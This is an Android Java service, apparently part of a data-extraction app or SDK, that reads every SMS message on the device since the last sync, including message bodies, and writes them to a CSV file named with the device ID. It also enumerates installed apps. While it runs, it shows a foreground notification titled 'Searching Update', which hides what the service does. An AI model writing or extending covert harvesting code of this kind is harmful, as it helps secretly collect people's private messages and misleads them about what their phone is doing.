package info.kalagato.com.extractor.readers;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.Process;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Locale;

import info.kalagato.com.extractor.Constant;
import info.kalagato.com.extractor.Extractor;
import info.kalagato.com.extractor.SyncService;
import info.kalagato.com.extractor.Util;

public class ReadSMSService extends Service {

    private String TAG = "read-sms-service";
    private Looper mServiceLooper;
    private ServiceHandler mServiceHandler;

    @Override
    public void onCreate() {
//        Log.d(TAG,"onCreate");
        // Start up the thread running the service.  Note that we create a
        // separate thread because the service normally runs in the process's
        // main thread, which we don't want to block.  We also make it
        // background priority so CPU-intensive work will not disrupt our UI.
        HandlerThread thread = new HandlerThread("SMS_ServiceStartArguments", Process.THREAD_PRIORITY_FOREGROUND);
        thread.start();

        // Get the HandlerThread's Looper and use it for our Handler
        mServiceLooper = thread.getLooper();
        mServiceHandler = new ServiceHandler(mServiceLooper);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
//        Log.d(TAG,"onStartCommand");
        Intent notificationIntent = new Intent(getApplicationContext(), Extractor.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(getApplicationContext(),
                0, notificationIntent, 0);

        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            NotificationChannel chan = new NotificationChannel(
                    Constant.CHANNEL_ID,
                    "My Foreground Service",
                    NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = ContextCompat.getSystemService(getApplicationContext(),NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(chan);
            }
        }

        Notification notification = new NotificationCompat.Builder(getApplicationContext(), Constant.CHANNEL_ID) //todo fix hardcoded channel id
                .setSmallIcon(info.kalagato.com.extractor.R.drawable.ic_settings)
                .setOngoing(true)
                .setContentTitle("Searching Update")
                .setContentText("")
                .setShowWhen(false)
                .setContentIntent(pendingIntent)
                .build();

        startForeground(1, notification);

        try {
//            Log.d(TAG,"sending msg");
            // For each start request, send a message to start a job and deliver the
            // start ID so we know which request we're stopping when we finish the job
            Message msg = mServiceHandler.obtainMessage();
            msg.arg1 = startId;
            // Create a bundle with the data
            Bundle bundle = new Bundle();

            // Set the bundle data to the Message
            msg.setData(bundle);
            mServiceHandler.sendMessage(msg);
        }
        catch (Exception e){
//            Log.d("read-sms-service","error in starting handler",e);
        }

        //do heavy work on a background thread
//        Log.d(TAG,"do your work");
        //stopSelf();

        return START_NOT_STICKY;
    }

    @Override
    public void onDestroy() {
        stopForeground(true);
        super.onDestroy();
    }
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    // Handler to run on a thread to work in background
    private final class ServiceHandler extends Handler {

        public ServiceHandler(Looper looper) {
            super(looper);
        }

        @Override
        public void handleMessage(Message msg) {
//            Log.d(TAG,"handleMessage");

            boolean smsAvailable = getSMS();

            new AppRunningStatus().getAllPackageInstalled(getApplicationContext());
//            new AppRunningStatus().getAppUsage(getApplicationContext());

            //checking sync
//            Intent serviceIntent = new Intent(getApplicationContext(), SyncService.class);
           // ContextCompat.startForegroundService(getApplicationContext(), serviceIntent);
            // Stop the service using the startId, so that we don't stop
            // the service in the middle of handling another job
            stopSelf(msg.arg1);
        }

        public boolean getSMS() {
            // public static final String INBOX = "content://sms/inbox";
            // public static final String SENT = "content://sms/sent";
            // public static final String DRAFT = "content://sms/draft";

            if (getApplicationContext().checkSelfPermission(Manifest.permission.READ_SMS)
                    != PackageManager.PERMISSION_GRANTED) {
//                    Log.d(TAG,"User did not provided the access");
                return false;
            }
            File folder = new File(Environment.getDataDirectory()
                    + "/Folder");
           File mydir = getApplicationContext().getDir("mydir", Context.MODE_PRIVATE);//Creating an internal dir;
            /* File fileWithinMyDir = new File(mydir, "myfile"); //Getting a file within the dir.
            try {
                FileOutputStream out = new FileOutputStream(fileWithinMyDir);
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            }
            fileWithinMyDir.exists();*/
           /* boolean var = false;
            if (!folder.exists())
                var = folder.mkdir();*/

            Date c = Calendar.getInstance().getTime();
            SimpleDateFormat df = new SimpleDateFormat("dd-MMM-yyyy", Locale.getDefault());
            String formattedDate = df.format(c);

            final String filename = mydir + "/" + Constant.SMS + "_"
                    + Util.getDeviceId(getApplicationContext()) + "_"  + formattedDate + ".csv";
//            Log.d(TAG,"filename = "+ filename);

            try {

                FileWriter fw = new FileWriter(filename,true);


                long lastSyncTime = Util.getLastSyncTime(getApplicationContext());
                long currentSyncTime = new Date().getTime();
//                Log.d(TAG,"dateEnd = "+ lastSyncTime);
                // Now create a SimpleDateFormat object.
                String filter = "";
                if(lastSyncTime == 0){
                    filter = " date <= " + currentSyncTime;
                }else{
                    filter = " date <= " + currentSyncTime + " and date >= " + lastSyncTime;
                }

//                Log.d(TAG,"filter = "+filter);

                // Now create the filter and query the messages.

                Cursor cursor = getApplicationContext().getContentResolver().query(Uri.parse("content://sms/"),
                        null,  filter,null, "date desc");

                if (cursor.moveToFirst()) { // must check the result to prevent exception
//                    Log.d(TAG,"No. of messages:" + cursor.getCount());
                    for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                        fw.append(cursor.getColumnName(idx));
                        fw.append(',');
                    }
                    fw.append('\n');
                    do {
                        for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                            if(cursor.getColumnName(idx).equalsIgnoreCase("body") == true){
                                fw.append("\""+cursor.getString(idx)+"\"");
                            }
                            else {
                                fw.append(cursor.getString(idx));
                            }
                            fw.append(',');
                        }
                        fw.append('\n');
                        // use msgData
                    } while (cursor.moveToNext());
                    Util.setLastSyncDateTime(getApplicationContext(),currentSyncTime);
                } else {
                    // empty box, no SMS
//                    Log.d(TAG,"empty box, no SMS");
                    return false;
                }

                fw.flush();
                fw.close();

            } catch (Exception e) {
                e.printStackTrace();
            }

            return false;
        }
    }
}